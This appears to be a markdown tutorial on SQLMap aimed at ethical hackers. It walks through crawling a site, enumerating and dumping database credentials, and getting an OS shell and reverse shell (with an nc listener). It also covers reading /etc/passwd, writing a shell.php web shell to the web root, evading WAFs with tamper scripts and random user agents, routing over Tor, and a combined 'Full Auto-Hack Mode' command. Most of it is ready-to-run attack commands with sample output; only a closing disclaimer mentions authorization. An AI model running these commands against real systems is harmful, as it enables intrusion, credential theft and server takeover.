# 📘 Mastering SQLMap: Practical SQL Injection Testing for Ethical Hackers

---

## ✅ Chapter 1: Introduction to SQLMap

**SQLMap** is an open-source penetration testing tool that automates the process of:
- Detecting SQL injection vulnerabilities
- Exploiting SQL injection flaws
- Taking over database servers

---

## ✅ Chapter 2: Installation of SQLMap

### On Linux (Debian/Ubuntu):

```bash
sudo apt update
sudo apt install sqlmap -y
```

### Manual Installation (Offline/Custom):

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py -h
```

---

## ✅ Chapter 3: Crawling the Target URL

SQLMap can crawl a website to find potential injection points.

```bash
sqlmap -u "http://testphp.vulnweb.com" --crawl=3 --batch
```

| Option | Description |
|--------|-------------|
| `--crawl=3` | Defines how deep SQLMap should crawl (1-3) |
| `--batch` | Runs in non-interactive mode (auto-confirm all prompts) |

---

## ✅ Chapter 4: Basic Usage

### Testing a Simple GET Parameter:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"
```

---

## ✅ Chapter 5: Key Options for Form and POST Testing

### `--forms` — Scan All Forms

```bash
sqlmap -u "http://testphp.vulnweb.com/login.php" --forms
```

### `--batch` — Non-Interactive Testing

```bash
sqlmap -u "http://target.com?id=1" --batch
```

### `--cookie` — Send Session Cookies

```bash
sqlmap -u "http://target.com" --cookie="PHPSESSID=abc123; token=xyz"
```

### `--data` and `--method` — POST Requests

```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" --method=POST
```

---

## ✅ Chapter 6: Risk and Level

| Option | Description | Range |
|--------|-------------|-------|
| `--risk` | Risk level of payloads | 1–3 |
| `--level` | Number of parameters to test | 1–5 |

### Example:

```bash
sqlmap -u "http://target.com?id=1" --level=5 --risk=3
```

---

## ✅ Chapter 7: Extracting Databases

```bash
sqlmap -u "http://target.com?id=1" --dbs
```

### Output:

```
available databases [3]:
[*] information_schema
[*] usersdb
[*] productsdb
```

---

## ✅ Chapter 8: Extracting Tables

```bash
sqlmap -u "http://target.com?id=1" -D usersdb --tables
```

### Output:

```
Database: usersdb
+------------+
| admin_users|
| customers  |
| logs       |
+------------+
```

---

## ✅ Chapter 9: Extracting Columns

```bash
sqlmap -u "http://target.com?id=1" -D usersdb -T admin_users --columns
```

### Output:

```
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| id        | int         |
| username  | varchar     |
| password  | varchar     |
+-----------+-------------+
```

---

## ✅ Chapter 10: Dumping Data

```bash
sqlmap -u "http://target.com?id=1" -D usersdb -T admin_users -C username,password --dump
```

### Output:

```
+----------+--------------+
| username | password     |
+----------+--------------+
| admin    | 5f4dcc3b5aa  |
| root     | 21232f297a57 |
+----------+--------------+
```

---

## ✅ Chapter 11: Advanced SQLMap Features

---

### 🧠 `--os-shell` — Command Execution Shell

```bash
sqlmap -u "http://target.com?id=1" --os-shell
```

#### Example:

```
os-shell> whoami
[INFO] retrieved: apache
```

---

### 💣 `--os-pwn` — Full Reverse Shell

```bash
sqlmap -u "http://target.com?id=1" --os-pwn
```

#### Listen with:

```bash
nc -lvnp 4444
```

---

### 📂 `--file-read` — Read a File from Server

```bash
sqlmap -u "http://target.com?id=1" --file-read="/etc/passwd"
```

---

### ✍️ `--file-write` & `--file-dest` — Write a File to Target

```bash
sqlmap -u "http://target.com?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

---

### 🧪 `--random-agent` — Bypass WAF by Faking User-Agent

```bash
sqlmap -u "http://target.com?id=1" --random-agent
```

---

### 🔬 `--tamper` — Use Evasion Techniques

```bash
sqlmap -u "http://target.com?id=1" --tamper=between,space2comment --random-agent
```

#### Tamper Scripts Location:

```
/usr/share/sqlmap/tamper/
```

---

### 🔁 `--threads` — Run Multiple Threads

```bash
sqlmap -u "http://target.com?id=1" --threads=10
```

---

### 🔐 `--auth-type` and `--auth-cred` — Test Authenticated Sections

```bash
sqlmap -u "http://target.com/admin" --auth-type=Basic --auth-cred=admin:admin123
```

---

### 🌐 `--proxy` — Route Traffic via Proxy

```bash
sqlmap -u "http://target.com" --proxy="http://127.0.0.1:8080"
```

---

### 🕸️ `--tor` — Run Through Tor Network

```bash
sqlmap -u "http://target.com" --tor --tor-type=SOCKS5 --check-tor
```

---

### 💥 `--technique` — Choose SQLi Technique

```bash
sqlmap -u "http://target.com?id=1" --technique=BEUST
```

| Letter | Technique |
|--------|-----------|
| B | Boolean-based blind |
| E | Error-based |
| U | Union query-based |
| S | Stacked queries |
| T | Time-based blind |

---

### 🧹 `--flush-session` — Clear Saved Session

```bash
sqlmap -u "http://target.com" --flush-session
```

---

## ✅ Chapter 12: Bonus – Full Auto-Hack Mode

```bash
sqlmap -u "http://target.com" \
  --crawl=3 \
  --level=5 \
  --risk=3 \
  --batch \
  --random-agent \
  --threads=10 \
  --technique=BEUST \
  --os-shell
```

---

## 📊 Quick Reference Card

| Option | Purpose |
|--------|---------|
| `-u` | Target URL |
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump data |
| `--batch` | Auto-confirm mode |
| `--level` | Test depth (1-5) |
| `--risk` | Payload risk (1-3) |
| `--os-shell` | Command execution |
| `--tamper` | Evasion techniques |
| `--threads` | Parallel requests |

---

## ⚠️ Important Notes

> **Disclaimer:** SQLMap is a powerful tool designed for **ethical hacking and penetration testing only**. Always ensure you have **proper authorization** before testing any target.

---

*"With great power comes great responsibility — use SQLMap wisely and ethically!"* 🔒💻